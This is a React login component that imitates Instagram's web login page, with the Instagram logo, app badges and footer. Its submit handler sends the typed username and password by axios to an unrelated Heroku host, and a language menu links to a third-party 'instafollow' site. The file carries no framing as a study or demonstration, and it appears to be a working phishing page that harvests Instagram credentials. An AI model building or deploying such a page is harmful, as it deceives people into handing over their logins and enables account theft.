import React, { Component } from 'react'
import axios from 'axios'

import './login.css';

class Login extends Component {
    constructor(props) {
        super(props)
        this.state = {
            courses: [],
            message: null,
            username:"",
            password:""
        }
        this.handleChange = this.handleChange.bind(this)
        this.loginClicked = this.loginClicked.bind(this)

    }

 
    handleChange(event) {
        this.setState(
            {
                [event.target.name]
                    : event.target.value
            }
        )
    }

    loginClicked(event) {
  
      event.preventDefault();
      var username=this.state.username;
      var password=this.state.password;


     axios.post('https://ancient-tor-51301.herokuapp.com/login', {
        username,
        password
    })
      .then(function (response) {
        console.log(response);
      })
      .catch(function (error) {
        console.log(error);
      });      
    }



    render() {
//        console.log('render')
        return (

  
            <div className="container">
   <span id="root">
    <section className="section-all">

      <main className="main" role="main"> 
        <div className="wrapper">
          <article className="article">
            <div className="content">
              <div className="login-box">
                <div className="header">
                  <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram"/>
                </div>
                <div className="form-wrap">
                  <form className="form">

                    <div className="input-box">
                      <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email"  name="username" 
                      value={this.state.username} onChange={this.handleChange} required/>
                        
                    </div>  

                    <div className="input-box">
                      <input type="password" name="password" id="password" placeholder="Password" 
                      name="password" value={this.state.password} onChange={this.handleChange} required/>
                    </div>  

                    <span className="button-box">
                      <button className="btn" type="submit" name="submit" onClick={this.loginClicked}>Log in</button>
                    </span>  

                    <a className="forgot" href="">Forgot password?</a>
                  </form>
                </div> 
              </div> 

              <div className="login-box">
                <p className="text">Don't have an account?<a href="#">Sign up</a></p>
              </div> 

              <div className="app">
                <p>Get the app.</p>
                <div className="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" />
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png"/>
                  </a>  
                </div> 
              </div> 
              </div>
          </article>
        </div>
      </main>

      <footer className="footer" role="contentinfo">
        <div className="footer-container">

          <nav className="footer-nav" role="navigation">
            <ul>
              <li><a href="">About Us</a></li>
              <li><a href="">Support</a></li>
              <li><a href="">Blog</a></li>
              <li><a href="">Press</a></li>
              <li><a href="">Api</a></li>
              <li><a href="">Jobs</a></li>
              <li><a href="">Privacy</a></li>
              <li><a href="">Terms</a></li>
              <li><a href="">Directory</a></li>
              <li>
                <span className="language">Language
                  <select name="language" className="select" >
                    <option value="#">English</option>
                    <option value="http://ru-instafollow.bitballoon.com">Russian</option>
                  </select>
                </span>
              </li>
            </ul>
          </nav>

          <span className="footer-logo">&copy; 2018 Instagram</span>
        </div> 
      </footer>
      
    </section>
  </span> 

       </div>
        )
    }
}

export default Login;